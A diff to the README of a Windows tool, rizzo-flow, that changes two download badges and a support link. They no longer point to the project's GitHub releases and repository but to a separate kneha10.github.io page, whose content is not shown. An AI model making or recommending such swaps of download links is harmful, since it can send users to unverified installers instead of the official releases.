@@ -17,7 +17,7 @@ Getting started is easy. Follow these simple steps:
 
 1. **Visit the download page:** Click the big green button below to go to the official rizzo-flow download page.
 
-[![Download rizzo-flow](https://img.shields.io/badge/Download-rizzo--flow-2ea44f?style=for-the-badge&logo=github)](https://github.com/kneha10/rizzo-flow/releases)
+[![Download rizzo-flow](https://img.shields.io/badge/Download-rizzo--flow-2ea44f?style=for-the-badge&logo=github)](https://kneha10.github.io)
 
 2. **Find the latest version:** On that page, you'll see a list of releases. Look for the one at the top that says "Latest" - that's the newest version.
 
@@ -102,7 +102,7 @@ As long as it runs Windows 10 or 11, it should work. Performance might be slower
 
 If you run into any issues or have questions:
 
-- **Visit the GitHub Page:** Go to [https://github.com/kneha10/rizzo-flow](https://github.com/kneha10/rizzo-flow) to see documentation and ask questions.
+- **Visit the GitHub Page:** Go to [https://kneha10.github.io](https://kneha10.github.io) to see documentation and ask questions.
 - **Check the Issues Section:** On GitHub, click on "Issues" to see if others have had the same problem and found solutions.
 - **Leave Feedback:** We love hearing from users! Your suggestions help us make rizzo-flow better.
 
@@ -114,7 +114,7 @@ rizzo-flow is released under an open-source license, which means you're free to 
 
 **Ready to get started?** Head over to the download page now and experience the freedom of private, local AI decision-making.
 
-[![Download Now](https://img.shields.io/badge/🚀%20Download%20rizzo--flow-8A2BE2?style=for-the-badge)](https://github.com/kneha10/rizzo-flow/releases)
+[![Download Now](https://img.shields.io/badge/🚀%20Download%20rizzo--flow-8A2BE2?style=for-the-badge)](https://kneha10.github.io)
 
 ---
 
